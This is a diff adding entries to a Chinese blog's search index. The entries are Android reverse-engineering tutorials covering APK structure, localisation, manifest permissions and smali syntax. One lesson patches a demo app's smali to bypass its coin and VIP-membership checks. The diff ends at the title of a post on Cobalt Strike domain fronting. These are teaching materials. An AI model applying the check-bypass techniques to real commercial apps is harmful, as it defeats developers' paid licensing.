+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906173559089.png" alt="image-20230906173559089"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906173639603.png" alt="image-20230906173639603"></p>
+<h5 id="Dex汉化"><a href="#Dex汉化" class="headerlink" title="Dex汉化"></a>Dex汉化</h5><p>对”   Reverse determines height,<br>development determines depth.”进行汉化</p>
+<p>搜索方法依旧采用搜索字符串就不再赘述</p>
+<p>搜索结果</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906174118968.png" alt="image-20230906174118968"></p>
+<p>选择Dex编辑器++</p>
+<p>再搜索找到详细位置</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906174259102.png" alt="image-20230906174259102"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906174333275.png" alt="image-20230906174333275"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906174456698.png" alt="image-20230906174456698"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906174445633.png" alt="image-20230906174445633"></p>
+<h4 id="修改图片"><a href="#修改图片" class="headerlink" title="修改图片"></a>修改图片</h4><p>需要先找到res目录，找到该图片</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906174905186.png" alt="image-20230906174905186"></p>
+<p>重新换一个图片，然后改成一样的名字cf.jpg</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906175029874.png" alt="image-20230906175029874"></p>
+<h5 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h5><p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906175125573.png" alt="image-20230906175125573"></p>
+<h4 id="修改app封面图标和app的名称"><a href="#修改app封面图标和app的名称" class="headerlink" title="修改app封面图标和app的名称"></a>修改app封面图标和app的名称</h4><p>使用np管理器中的”通用编辑”功能</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230907092428012.png" alt="image-20230907092428012"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230907092506831.png" alt="image-20230907092506831"></p>
+<p>修改好后安装即可</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230907092534934.png" alt="image-20230907092534934"></p>
+<h3 id="初识AndroidManifest-xml"><a href="#初识AndroidManifest-xml" class="headerlink" title="初识AndroidManifest.xml"></a>初识AndroidManifest.xml</h3><p>AndroidManifest.xml文件是整个应用程序的信息描述文件，定义了应用程序中包含的Activity,Service,Content provider和BroadcastReceiver组件信息。每个应用程序在根目录下必须包含一个AndroidManifest.xml文件，且文件名不能修改。它描述了package中暴露的组件，他们各自的实现类，各种能被处理的数据和启动位置。</p>
+<table>
+<thead>
+<tr>
+<th align="left">属性</th>
+<th align="left">定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">versionCode</td>
+<td align="left">版本号，主要用来更新，例如:12</td>
+</tr>
+<tr>
+<td align="left">versionName</td>
+<td align="left">版本名，给用户看的，例如:1.2</td>
+</tr>
+<tr>
+<td align="left">package</td>
+<td align="left">包名，例如：com.zj.52pj.demo</td>
+</tr>
+<tr>
+<td align="left">uses-permission android:name=””</td>
+<td align="left">应用权限，例如：android.permission.INTERNET 代表网络权限</td>
+</tr>
+<tr>
+<td align="left">android:label=”@string/app_name”</td>
+<td align="left">应用名称</td>
+</tr>
+<tr>
+<td align="left">android:icon=”@mipmap/ic_launcher”</td>
+<td align="left">应用图标路径</td>
+</tr>
+<tr>
+<td align="left">android:debuggable=”true”</td>
+<td align="left">应用是否开启debug权限，动态调试时会用到的一个权限</td>
+</tr>
+</tbody></table>
+<p>对于第四个应用权限，uses-permission android:name=””，假如一款app在使用前向我们索要摄像头权限，若不给就会退出app。这时候我们可以反编译AndroidManifest.xml文件，找到关于摄像头权限的属性，将其注释掉就好了，相当于禁用了该权限。</p>
+<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p><a href="https://www.52pojie.cn/thread-1695796-1-1.html">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修</a></p>
+<p><a href="https://www.bilibili.com/video/BV18G411j7gV/?spm_id_from=333.788&amp;vd_source=fb474708f246c21e5933eeb76372688d">https://www.bilibili.com/video/BV18G411j7gV/?spm_id_from=333.788&amp;vd_source=fb474708f246c21e5933eeb76372688d</a></p>
+<p><a href="https://www.aliyundrive.com/s/TJoKMK6du6x">https://www.aliyundrive.com/s/TJoKMK6du6x</a></p>
+]]></content>
+      <categories>
+        <category>安卓逆向</category>
+      </categories>
+      <tags>
+        <tag>re</tag>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>003第三节.初识smali，vip终结者</title>
+    <url>/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/</url>
+    <content><![CDATA[<h2 id="课程目标"><a href="#课程目标" class="headerlink" title="课程目标"></a>课程目标</h2><ol>
+<li>了解JVM、Dalvik、ART</li>
+<li>初识smali语法</li>
+<li>实战修改smali</li>
+</ol>
+<h2 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h2><ol>
+<li><p>教程Demo(更新)</p>
+</li>
+<li><p>MT管理器/NP管理器</p>
+</li>
+<li><p>雷电模拟器</p>
+</li>
+<li><p>jadx-gui</p>
+</li>
+<li><p>核心破解</p>
+<p>安装核心破解，会出现这种弹窗</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907094921132.png" alt="image-20230907094921132"></p>
+<p>点进去然后启用页面选择系统框架，之后退出重启模拟器</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907094959854.png" alt="image-20230907094959854"></p>
+<p>记得勾选如下内容</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907095120194.png" alt="image-20230907095120194"></p>
+</li>
+</ol>
+<h2 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h2><h3 id="什么是JVM、Dalvik、ART"><a href="#什么是JVM、Dalvik、ART" class="headerlink" title="什么是JVM、Dalvik、ART"></a>什么是JVM、Dalvik、ART</h3><p>JVM是JAVA虚拟机，运行JAVA字节码程序</p>
+<p>Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)</p>
+<p>Art(Android Runtime)相当于Dalvik的升级版，本质与Dalvik无异</p>
+<h3 id="smali及其语法"><a href="#smali及其语法" class="headerlink" title="smali及其语法"></a>smali及其语法</h3><p>smali是Dalvik的寄存器语言，smali代码是dex反编译而来的。</p>
+<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">.class</td>
+<td align="left">类名</td>
+</tr>
+<tr>
+<td align="left">.super</td>
+<td align="left">父类名，继承的上级类名名称</td>
+</tr>
+<tr>
+<td align="left">.source</td>
+<td align="left">源名</td>
+</tr>
+<tr>
+<td align="left">.field</td>
+<td align="left">变量</td>
+</tr>
+<tr>
+<td align="left">.method</td>
+<td align="left">方法名</td>
+</tr>
+<tr>
+<td align="left">.register</td>
+<td align="left">寄存器</td>
+</tr>
+<tr>
+<td align="left">.end method</td>
+<td align="left">方法名的结束</td>
+</tr>
+<tr>
+<td align="left">public</td>
+<td align="left">公有</td>
+</tr>
+<tr>
+<td align="left">protected</td>
+<td align="left">半公开，只有同一家人才能用</td>
+</tr>
+<tr>
+<td align="left">private</td>
+<td align="left">私有，只能自己使用</td>
+</tr>
+<tr>
+<td align="left">.parameter</td>
+<td align="left">方法参数</td>
+</tr>
+<tr>
+<td align="left">.prologue</td>
+<td align="left">方法开始</td>
+</tr>
+<tr>
+<td align="left">.line xxx</td>
+<td align="left">位于第xxx行</td>
+</tr>
+</tbody></table>
+<h4 id="数据类型对应"><a href="#数据类型对应" class="headerlink" title="数据类型对应"></a>数据类型对应</h4><table>
+<thead>
+<tr>
+<th align="left">smali类型</th>
+<th align="left">java类型</th>
+<th align="left">注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">V</td>
+<td align="left">void</td>
+<td align="left">无返回值</td>
+</tr>
+<tr>
+<td align="left">Z</td>
+<td align="left">boolean</td>
+<td align="left">布尔值类型，返回0或1</td>
+</tr>
+<tr>
+<td align="left">B</td>
+<td align="left">byte</td>
+<td align="left">字节类型，返回字节</td>
+</tr>
+<tr>
+<td align="left">S</td>
+<td align="left">short</td>
+<td align="left">短整数类型，返回数字</td>
+</tr>
+<tr>
+<td align="left">C</td>
+<td align="left">char</td>
+<td align="left">字符类型，返回字符</td>
+</tr>
+<tr>
+<td align="left">I</td>
+<td align="left">int</td>
+<td align="left">整数类型，返回数字</td>
+</tr>
+<tr>
+<td align="left">J</td>
+<td align="left">long （64位 需要2个寄存器存储）</td>
+<td align="left">长整数类型，返回数字</td>
+</tr>
+<tr>
+<td align="left">F</td>
+<td align="left">float</td>
+<td align="left">单浮点类型，返回数字</td>
+</tr>
+<tr>
+<td align="left">D</td>
+<td align="left">double （64位 需要2个寄存器存储）</td>
+<td align="left">双浮点类型，返回数字</td>
+</tr>
+<tr>
+<td align="left">string</td>
+<td align="left">String</td>
+<td align="left">文本类型，返回字符串</td>
+</tr>
+<tr>
+<td align="left">Lxxx/xxx/xxx</td>
+<td align="left">object</td>
+<td align="left">对象类型，返回对象</td>
+</tr>
+</tbody></table>
+<h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h4><table>
+<thead>
+<tr>
+<th align="left">关键字</th>
+<th align="left">注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">const</td>
+<td align="left">重写整数属性，真假属性内容，只能是数字类型</td>
+</tr>
+<tr>
+<td align="left">const-string</td>
+<td align="left">重写字符串内容</td>
+</tr>
+<tr>
+<td align="left">const-wide</td>
+<td align="left">重写长整数类型，多用于修改到期时间。</td>
+</tr>
+<tr>
+<td align="left">return</td>
+<td align="left">返回指令</td>
+</tr>
+<tr>
+<td align="left">if-eq</td>
+<td align="left">全称equal(a=b)，比较寄存器ab内容，相同则跳</td>
+</tr>
+<tr>
+<td align="left">if-ne</td>
+<td align="left">全称not equal(a!=b)，ab内容不相同则跳</td>
+</tr>
+<tr>
+<td align="left">if-eqz</td>
+<td align="left">全称equal zero(a=0)，z即是0的标记，a等于0则跳</td>
+</tr>
+<tr>
+<td align="left">if-nez</td>
+<td align="left">全称not equal zero(a!=0)，a不等于0则跳</td>
+</tr>
+<tr>
+<td align="left">if-ge</td>
+<td align="left">全称greater equal(a&gt;=b)，a大于或等于则跳</td>
+</tr>
+<tr>
+<td align="left">if-le</td>
+<td align="left">全称little equal(a&lt;=b)，a小于或等于则跳</td>
+</tr>
+<tr>
+<td align="left">goto</td>
+<td align="left">强制跳到指定位置</td>
+</tr>
+<tr>
+<td align="left">switch</td>
+<td align="left">分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>
+</tr>
+<tr>
+<td align="left">iget</td>
+<td align="left">获取寄存器数据</td>
+</tr>
+</tbody></table>
+<p>其余指令可用语法工具查询</p>
+<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>在smali里的所有操作都必须经过寄存器来进行:本地寄存器（类似方法的局部变量）用v开头数字结尾的符号来表示，如v0、 v1、v2。 参数寄存器（类似方法的参数）则使用p开头数字结尾的符号来表示，如p0、p1、p2。特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个 参数，p2代表函数中的第二个参数。而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法）</p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>点进demo看一下，”一键三连”还要冲会员</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907095502751.png" alt="image-20230907095502751"></p>
+<h4 id="反编译的smali代码"><a href="#反编译的smali代码" class="headerlink" title="反编译的smali代码"></a>反编译的smali代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一个私有、静态、不可变的方法   方法名</span></span><br><span class="line">.method <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> onCreate$lambda-<span class="number">2</span>(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z <span class="comment">//(这里面是方法的参数类型)这里是方法返回值类型，表示布尔值类型，返回假或真</span></span><br><span class="line">    .registers <span class="number">7</span>  <span class="comment">//寄存器数量</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">33</span>  <span class="comment">//代码所在的行数</span></span><br><span class="line">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I  <span class="comment">//读取p0(第一个参数，参考寄存器知识)中element的值赋值给p0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> p5, <span class="number">0x1</span>  <span class="comment">//p5赋值1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>/<span class="number">16</span> v0, <span class="number">0xa</span> <span class="comment">//v0赋值10，在16进制里a表示10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-ge p0, v0, :cond_15  <span class="comment">//判断p0的值是否大于或等于v0的值(即p0的值是否大于或等于10)，如果大于或等于则跳转到:cond_15</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">34</span>  <span class="comment">//以下是常见的Toast弹窗代码</span></span><br><span class="line">    check-cast p1, Landroid/content/Context; <span class="comment">//检查Context对象引用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>-string p0, <span class="string">&quot;请先获取10个硬币哦&quot;</span> <span class="comment">//弹窗文本信息，把&quot;&quot;里的字符串数据赋值给p0</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence; <span class="comment">//检查CharSequence对象引用</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; </span><br><span class="line">    <span class="comment">//将弹窗文本、显示时间等信息传给p1</span></span><br><span class="line"></span><br><span class="line">    move-result-object p0  <span class="comment">//结果传递给p0</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V  <span class="comment">//当看到这个Toast;-&gt;show你就应该反应过来这里是弹窗代码</span></span><br><span class="line"></span><br><span class="line">    goto :goto_31  <span class="comment">//跳转到:goto_31</span></span><br><span class="line"></span><br><span class="line">    :cond_15 <span class="comment">//跳转的一个地址</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z  <span class="comment">//判断isvip方法的返回值是否为真(即结果是否为1)</span></span><br><span class="line"></span><br><span class="line">    move-result p0  <span class="comment">//结果赋值给p0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-eqz p0, :cond_43 <span class="comment">//如果结果为0则跳转cond_43地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> p0, <span class="number">0x7f0d0018</span>  <span class="comment">//在arsc中的id索引，这个值可以进行查询</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">37</span></span><br><span class="line">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V <span class="comment">//设置图片资源</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> p0, <span class="number">0x7f0d0008</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">38</span></span><br><span class="line">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> p0, <span class="number">0x7f0d000a</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">40</span></span><br><span class="line">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; </span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> p2, <span class="number">0x2</span> <span class="comment">//p2赋值2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>-string p3, <span class="string">&quot;level&quot;</span> <span class="comment">//sp的索引</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V <span class="comment">//写入数据</span></span><br><span class="line"></span><br><span class="line">    goto :goto_50 <span class="comment">//跳转地址</span></span><br><span class="line"></span><br><span class="line">    :cond_43</span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>-string p0, <span class="string">&quot;\u8bf7\u5148\u5145\u503c\u5927\u4f1a\u5458\u54e6\uff01&quot;</span> <span class="comment">//请先充值大会员哦！</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :goto_50</span><br><span class="line">    <span class="keyword">return</span> p5  <span class="comment">//返回p5的值</span></span><br><span class="line">.end method <span class="comment">//方法结束</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否是大会员的方法</span></span><br><span class="line">.<span class="function">method <span class="keyword">public</span> <span class="keyword">final</span> <span class="title">isvip</span><span class="params">()</span>Z</span></span><br><span class="line"><span class="function">    .registers 2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="keyword">const</span>/4 v0, 0x0 <span class="comment">//v0赋值0</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    return v0 <span class="comment">//返回v0的值</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">.end method</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="逆向关键点"><a href="#逆向关键点" class="headerlink" title="逆向关键点"></a>逆向关键点</h3><p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907094432411.png" alt="image-20230907094432411"></p>
+<h4 id="快速定位"><a href="#快速定位" class="headerlink" title="快速定位"></a>快速定位</h4><p>需要对app程序流程逻辑上进行修改，所以要反编译classes.dex，搜索定位也是在反编译的classes.dex中进行</p>
+<h5 id="搜索关键字"><a href="#搜索关键字" class="headerlink" title="搜索关键字"></a>搜索关键字</h5><p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907101350781.png" alt="image-20230907101350781"></p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907101410407.png" alt="image-20230907101410407"></p>
+<h5 id="抓取按钮id，利用id搜索"><a href="#抓取按钮id，利用id搜索" class="headerlink" title="抓取按钮id，利用id搜索"></a>抓取按钮id，利用id搜索</h5><p>借助开发者助手app获取id</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907100118749.png" alt="image-20230907100118749"></p>
+<p>获取到id后，利用id进行整数型十六进制搜索</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907100401675.png" alt="image-20230907100401675"></p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907100421315.png" alt="image-20230907100421315"></p>
+<p>点进去判断一下是不是要找的代码</p>
+<h4 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h4><h5 id="1-修改判断"><a href="#1-修改判断" class="headerlink" title="1.修改判断"></a>1.修改判断</h5><p>修改if-ge为if-le,if-le就是p0&lt;=v0发生跳转，硬币这里通过后</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907101715214.png" alt="image-20230907101715214"></p>
+<p>接着是大会员，将判断函数注释掉就不会发生跳转</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907101854940.png" alt="image-20230907101854940"></p>
+<h5 id="2-强制跳转"><a href="#2-强制跳转" class="headerlink" title="2.强制跳转"></a>2.强制跳转</h5><p>先在这里设置一个跳转点，相当于直接跳过硬币和会员判定</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907102211005.png" alt="image-20230907102211005"></p>
+<p>再在前面设置一个强制跳转</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907102227499.png" alt="image-20230907102227499"></p>
+<h5 id="3-修改寄存器的值"><a href="#3-修改寄存器的值" class="headerlink" title="3.修改寄存器的值"></a>3.修改寄存器的值</h5><p>绕过10个硬币的限制，把这个要求达到的硬币数量改成0</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907102411604.png" alt="image-20230907102411604"></p>
+<p>接下来需要绕过isvip的判断，先定位到isvip函数的位置（长按会出现”定位”）</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907102547539.png" alt="image-20230907102547539"></p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907102630748.png" alt="image-20230907102630748"></p>
+<p>分析isvip()函数逻辑后，将返回值改为1即可</p>
+<p><img src="/2023/08/28/003%E7%AC%AC%E4%B8%89%E8%8A%82.%E5%88%9D%E8%AF%86smali%EF%BC%8Cvip%E7%BB%88%E7%BB%93%E8%80%85/image-20230907102714110.png" alt="image-20230907102714110"></p>
+<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p><a href="https://www.52pojie.cn/thread-1701353-1-1.html">《安卓逆向这档事》三、初识smali，vip终结者</a></p>
+<p><a href="https://www.bilibili.com/video/BV1G8411e7HT/?spm_id_from=333.788&amp;vd_source=fb474708f246c21e5933eeb76372688d">https://www.bilibili.com/video/BV1G8411e7HT/?spm_id_from=333.788&amp;vd_source=fb474708f246c21e5933eeb76372688d</a></p>
+<p><a href="https://www.aliyundrive.com/s/TJoKMK6du6x">https://www.aliyundrive.com/s/TJoKMK6du6x</a></p>
+]]></content>
+      <categories>
+        <category>安卓逆向</category>
+      </categories>
+      <tags>
+        <tag>re</tag>
+        <tag>Android</tag>
       </tags>
   </entry>
   <entry>
@@ -166,6 +576,142 @@
 ]]></content>
       <tags>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CS流量隐藏-域前置技术</title>
+    <url>/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/</url>
